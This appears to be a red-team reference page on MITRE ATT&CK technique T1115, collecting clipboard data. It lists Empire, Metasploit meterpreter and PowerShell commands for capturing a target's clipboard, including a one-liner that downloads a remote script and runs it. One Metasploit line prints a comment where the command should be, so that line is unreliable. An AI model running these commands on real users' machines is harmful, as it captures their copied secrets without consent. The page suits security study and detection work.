---
description: https://attack.mitre.org/techniques/T1115/
---

# Clipboard Data

**ATT\&CK ID:** [T1115](https://attack.mitre.org/techniques/T1115/)

**Permissions Required:** <mark style="color:green;">**User**</mark>

**Description**

Adversaries may collect data stored in the clipboard from users copying information within or between applications.

In Windows, Applications can access clipboard data by using the Windows API.

\[[Source](https://attack.mitre.org/techniques/T1115/)]

## Techniques

### Empire

This module monitors the clipboard on a specified interval for changes to copied\
text.

```
usemodule powershell/collection/clipboard_monitor
```

![](../../../.gitbook/assets/Empire-Clipboard.png)

### Get-ClipboardContents

`Get-ClipboardContents` monitors for information currently in the clipboard and anything that may be copied to the clipboard for the duration of the scripts execution time.

```powershell
iex (iwr -usebasicparsing https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1);Get-ClipboardContents
```

![](../../../.gitbook/assets/Get-ClipboardContents.png)

### Metasploit

This Metasploit module can be loaded from the meterpreter shell.

```bash
load extapi

# Read the target's current clipboard (text, files, images)
clipboard_get_data

# Dump all captured clipboard content
clipboard_monitor_dump

# Pause the active clipboard monitor
clipboard_monitor_pause

# Delete all captured clipboard content without dumping it
clipboard_monitor_purge

# Resume the paused clipboard monitor
clipboard_monitor_resume

# Start the clipboard monitor   
Start the clipboard monitor

# Stop the clipboard monitor   
clipboard_monitor_stop

# Write text to the target's clipboard    
clipboard_set_text
```

### PowerShell

The native PowerShell command `Get-Clipboard` retrieves information that is currently stored in the clipboard.

```powershell
Get-Clipboard
```

![](../../../.gitbook/assets/PS-Get-Clipboard.png)

## Mitigations

* Monitor executed commands and arguments to collect data stored in the clipboard from users copying information within or between applications.
* Monitor API calls that could collect data stored in the clipboard from users copying information within or between applications.
